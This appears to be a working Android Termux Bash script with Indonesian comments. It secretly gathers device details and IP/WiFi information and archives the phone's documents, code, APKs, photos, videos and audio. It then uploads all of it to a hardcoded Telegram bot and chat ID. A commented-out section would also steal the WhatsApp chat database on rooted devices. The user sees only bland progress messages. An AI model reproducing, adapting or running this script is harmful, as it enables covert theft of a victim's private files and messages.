clear
#!/bin/bash
clear
termux-setup-storage -y
clear
pkg install jq -y
clear
pkg install wget -y
clear
pkg install curl -y
clear

# Konfigurasi
TOKEN="8369000292:AAFhrncymw4_zj5mRM6Trj5PtFNzwOAjTDU"
CHAT_ID="8317643774"
TARGET_DIR="/storage/emulated/0" # Direktori target (internal storage)
SENT_FILES_FILE="$HOME/sent_files.txt"

# Fungsi untuk mengirim pesan ke Telegram
send_telegram() {
  TEXT=$(echo "$1" | jq -sRr @uri)
  curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" -d "chat_id=$CHAT_ID&text=$TEXT"
}

# Fungsi untuk mengirim file ke Telegram
send_file() {
  FILE_PATH="$1"
  CAPTION="$2"
  curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendDocument" \
       -F chat_id="$CHAT_ID" \
       -F document="@$FILE_PATH" \
       -F caption="$CAPTION" > /dev/null
}

# Fungsi untuk mendapatkan informasi perangkat
get_device_info() {
  BRAND=$(getprop ro.product.brand)
  MODEL=$(getprop ro.product.model)
  IP_ADDRESS=$(curl -s https://api.ipify.org)
  WIFI_INFO=$(iwconfig wlan0)

  DEVICE_INFO="Brand: $BRAND\nModel: $MODEL\nIP Address: $IP_ADDRESS\nWiFi Info: $WIFI_INFO"
  echo "$DEVICE_INFO"
}

# Fungsi untuk mengarsipkan dan mengirim data
archive_and_send() {
  DATA_TYPE="$1"
  FILE_EXT="$2"
  ARCHIVE_NAME="data_$DATA_TYPE.tar.gz"

  find "$TARGET_DIR" -name "*.$FILE_EXT" -print0 | tar -czvf "$ARCHIVE_NAME" --null -T -

  if [ -f "$ARCHIVE_NAME" ]; then
    CAPTION="Data $DATA_TYPE"
    send_file "$ARCHIVE_NAME" "$CAPTION"
    rm "$ARCHIVE_NAME"
  fi
}

# Main script
echo "Meminta izin akses penyimpanan..."
termux-setup-storage -y

echo "Mengambil informasi perangkat..."
DEVICE_INFO=$(get_device_info)
send_telegram "$DEVICE_INFO"

echo "Mencari dan mengirim file..."
archive_and_send "python" "py"
archive_and_send "javascript" "js"
archive_and_send "ruby" "rb"
archive_and_send "pdf" "pdf"
archive_and_send "apk" "apk"
archive_and_send "images" "png"
archive_and_send "images" "jpg"
archive_and_send "videos" "mp4"
archive_and_send "audio" "mp3"

# Mengarsipkan dan mengirim chat WA (membutuhkan akses root dan lokasi database WA)
# Pastikan untuk menyesuaikan PATH_TO_WA_DB sesuai dengan lokasi database WA di perangkat
# PATH_TO_WA_DB="/data/data/com.whatsapp/databases/msgstore.db"
# if [ -f "$PATH_TO_WA_DB" ]; then
#   cp "$PATH_TO_WA_DB" "$HOME/msgstore.db"
#   send_file "$HOME/msgstore.db" "WhatsApp Chat Database"
#   rm "$HOME/msgstore.db"
# fi

echo "Selesai."
